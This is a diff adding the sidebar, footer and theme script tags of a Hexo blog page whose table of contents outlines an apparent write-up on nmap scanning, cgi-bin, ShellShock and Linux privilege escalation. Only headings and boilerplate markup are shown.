+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Unc1e</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Entry-point"><span class="nav-number">1.</span> <span class="nav-text">Entry point</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#nmap"><span class="nav-number">1.1.</span> <span class="nav-text">nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgi-bin"><span class="nav-number">1.2.</span> <span class="nav-text">&#x2F;cgi-bin&#x2F;</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#OSINT"><span class="nav-number">1.3.</span> <span class="nav-text">OSINT</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cgi-bin-user-sh"><span class="nav-number">1.4.</span> <span class="nav-text">&#x2F;cgi&#x2F;bin&#x2F;user.sh</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#priv-esc"><span class="nav-number">2.</span> <span class="nav-text">priv esc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-perl"><span class="nav-number">2.1.</span> <span class="nav-text">sudo perl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#priv-esc-via-lxd"><span class="nav-number">2.2.</span> <span class="nav-text">priv esc via lxd</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Note-on-ShellShock"><span class="nav-number">3.</span> <span class="nav-text">Note on ShellShock</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#原理"><span class="nav-number">3.1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#测试"><span class="nav-number">3.2.</span> <span class="nav-text">测试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fuzzing-列表"><span class="nav-number">3.3.</span> <span class="nav-text">Fuzzing 列表</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复建议"><span class="nav-number">3.4.</span> <span class="nav-text">修复建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#感慨"><span class="nav-number">3.5.</span> <span class="nav-text">感慨</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#reference"><span class="nav-number">4.</span> <span class="nav-text">reference</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Unc1e</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
